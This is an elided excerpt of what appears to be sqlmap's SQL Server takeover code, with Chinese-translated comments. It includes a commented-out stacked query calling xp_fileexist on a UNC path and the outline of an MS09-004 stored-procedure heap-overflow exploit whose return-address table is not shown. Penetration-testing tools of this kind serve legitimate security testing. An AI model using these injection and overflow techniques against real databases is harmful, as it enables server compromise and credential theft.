...
class Takeover(GenericTakeover):
    ...
    def uncPathRequest(self):
        # insert.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath，silent=True)
    ...
    def spHeapOverflow(self):
        ...
        * https://support.microsoft.com/en-us/help/959420/ms09-004-vulnerabilities-in-microsoft-sql-server-could-allow-remote-co
        ...
        returns = {
            ...
            # 2003 Service Pack 2 更新于 12/2008
            ...
            # 2003 Service Pack 2 更新于 05/2009
            ...
            # 2003 Service Pack 2 更新于 09/2009
        ...
        if not addrs:
            errMsg = 'sqlmap 无法利用存储过程缓冲区 '
            errMsg += '溢出，因为它没有有效的返回值 '
            errMsg += '底层操作系统的代码（Windows '
            errMsg += '%s 服务包 %d)' % (Backend.getOsVersion(), Backend.getOsServicePack())
